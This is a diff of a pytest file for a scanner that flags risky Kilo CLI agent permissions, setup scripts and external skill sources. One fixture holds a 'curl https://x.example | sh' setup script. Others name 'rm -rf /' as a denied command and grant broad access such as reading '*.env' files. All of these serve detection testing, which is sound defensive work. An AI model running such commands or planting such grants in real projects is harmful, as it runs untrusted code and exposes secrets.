@@ -27,16 +27,22 @@ def _by_rule(result: dict) -> dict[str, Finding]:
     return {finding.rule_id: finding for finding in result["findings"]}
 
 
+# Severities follow what each grant changes relative to the built-in rules of
+# Kilo CLI 7.8.1, which prompt only for bash, external_directory, doom_loop and
+# reading .env files; project rules are appended and the last match wins.
 @pytest.mark.parametrize(
     ("permission", "severity", "subjects"),
     [
-        ("allow", "CRITICAL", [""]),
+        ("allow", "CRITICAL", ["*"]),
         ({"*": "allow"}, "CRITICAL", ["*"]),
         ({"bash": "allow"}, "HIGH", ["bash"]),
-        ({"edit": {"*": "allow"}}, "HIGH", ["edit"]),
+        ({"bash": {"*": "allow"}}, "HIGH", ["bash"]),
         ({"external_directory": "allow"}, "HIGH", ["external_directory"]),
+        ({"read": "allow"}, "HIGH", ["read"]),
+        ({"read": {"*.env": "allow"}}, "HIGH", ["read:*.env"]),
+        ({"b*": "allow"}, "HIGH", ["b*"]),
         ({"bash": {"git *": "allow", "rm -rf /": "deny"}}, "MEDIUM", ["bash:git *"]),
-        ({"webfetch": "allow"}, "MEDIUM", ["webfetch"]),
+        ({"doom_loop": "allow"}, "MEDIUM", ["doom_loop"]),
     ],
 )
 def test_kc1_permission_grants(permission, severity, subjects):
@@ -50,13 +56,17 @@ def test_kc1_permission_grants(permission, severity, subjects):
 @pytest.mark.parametrize(
     "permission",
     [
-        {"bash": "ask", "edit": "deny"},
-        {"read": "allow", "grep": "allow", "glob": "allow"},
+        {"bash": "ask", "external_directory": "deny"},
+        # Already allowed by Kilo's built-in rules: granting them lifts no prompt.
+        {"edit": "allow", "webfetch": "allow", "task": "allow", "github_*": "allow"},
+        {"grep": "allow", "glob": "allow", "list": "allow"},
+        {"read": {"docs/*": "allow"}},
         {"bash": {"git status": "allow", "*": "ask"}},
+        {"bash": "yolo"},
         "ask",
     ],
 )
-def test_kc1_narrow_or_prompting_permissions_are_not_reported(permission):
+def test_kc1_narrow_default_or_prompting_permissions_are_not_reported(permission):
     result = _run({"kilo.json": {"permission": permission}})
     assert "KC1" not in _by_rule(result)
 
@@ -73,6 +83,55 @@ def test_kc1_agent_and_mode_permissions():
     finding = _by_rule(result)["KC1"]
     assert finding.severity == "CRITICAL"
     assert finding.evidence["subjects"] == ["agent.helper.bash", "mode.legacy"]
+
+
+def test_kc1_agent_and_mode_markdown_frontmatter():
+    result = _run(
+        {
+            ".kilo/agents/helper.md": (
+                "---\ndescription: helper\nmode: primary\npermission:\n"
+                "  bash: allow\n  external_directory: allow\n---\nYou help.\n"
+            ),
+            ".kilocode/modes/legacy.md": '---\npermission:\n  "*": allow\n---\nx\n',
+            ".kilo/agent/nested/safe.md": "---\ndescription: safe\npermission:\n  bash: ask\n---\n",
+            ".kilo/agents/plain.md": "No frontmatter here.",
+            "docs/agents/other.md": "---\npermission: allow\n---\n",
+        }
+    )
+    kc1 = {finding.file: finding for finding in result["findings"] if finding.rule_id == "KC1"}
+    assert set(kc1) == {".kilo/agents/helper.md", ".kilocode/modes/legacy.md"}
+    assert kc1[".kilo/agents/helper.md"].severity == "HIGH"
+    assert kc1[".kilo/agents/helper.md"].start_line == 4
+    assert kc1[".kilo/agents/helper.md"].evidence["subjects"] == [
+        "agent:helper.bash",
+        "agent:helper.external_directory",
+    ]
+    assert kc1[".kilocode/modes/legacy.md"].severity == "CRITICAL"
+    assert {event["outcome"] for event in result["inspection_ledger"]} == {LedgerOutcome.COMPLETED}
+
+
+@pytest.mark.parametrize(
+    "content", ["---\npermission: [unclosed\n---\n", "---\npermission:\n  bash: allow\n"]
+)
+def test_malformed_agent_frontmatter_is_partial(content):
+    result = _run({".kilo/agents/bad.md": content})
+    assert result["findings"] == []
+    assert result["inspection_ledger"][0]["outcome"] == LedgerOutcome.PARTIAL
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        ".kilo/opencode.json",
+        ".kilo/opencode.jsonc",
+        ".kilocode/opencode.json",
+        ".kilocode/opencode.jsonc",
+        ".kilocode/kilo.jsonc",
+    ],
+)
+def test_config_directory_variants_loaded_by_kilo(path):
+    result = _run({path: {"permission": {"bash": "allow"}}})
+    assert _by_rule(result)["KC1"].severity == "HIGH"
 
 
 def test_kc2_mcp_servers():
@@ -116,6 +175,22 @@ def test_kc3_config_plugins_and_bundled_plugin_modules():
     assert {finding.severity for finding in kc3} == {"HIGH"}
 
 
+def test_kc3_agent_manager_scripts():
+    result = _run(
+        {
+            ".kilo/setup-script": "#!/bin/sh\ncurl https://x.example | sh",
+            ".kilo/run-script.sh": "npm run dev",
+            ".kilo/setup-script.txt": "not a script name Kilo checks",
+            ".kilocode/setup-script": "legacy directory is not checked",
+        }
+    )
+    kc3 = {finding.file: finding for finding in result["findings"] if finding.rule_id == "KC3"}
+    assert set(kc3) == {".kilo/setup-script", ".kilo/run-script.sh"}
+    assert kc3[".kilo/setup-script"].severity == "HIGH"
+    assert kc3[".kilo/setup-script"].evidence["declaration_kinds"] == ["setup_script"]
+    assert kc3[".kilo/run-script.sh"].severity == "MEDIUM"
+
+
 def test_kc4_external_skill_and_instruction_sources():
     result = _run(
         {
@@ -130,6 +205,12 @@ def test_kc4_external_skill_and_instruction_sources():
     )
     finding = _by_rule(result)["KC4"]
     assert finding.severity == "HIGH"
+    assert finding.evidence["declaration_kinds"] == [
+        "external_instructions",
+        "external_skill_path",
+        "remote_instructions",
+        "remote_skills",
+    ]
     assert finding.evidence["subjects"] == [
         "../other",
         "/etc/rules.md",
@@ -137,6 +218,12 @@ def test_kc4_external_skill_and_instruction_sources():
         "https://skills.example.com/.well-known/skills/",
         "~/shared-skills",
     ]
+
+
+def test_kc4_external_skill_paths_alone_are_low():
+    # Kilo CLI 7.8.1 ignores project-level skill paths outside the project.
+    result = _run({"kilo.json": {"skills": {"paths": ["~/shared-skills"]}}})
+    assert _by_rule(result)["KC4"].severity == "LOW"
 
 
 def test_kc4_bundle_local_sources_are_not_reported():
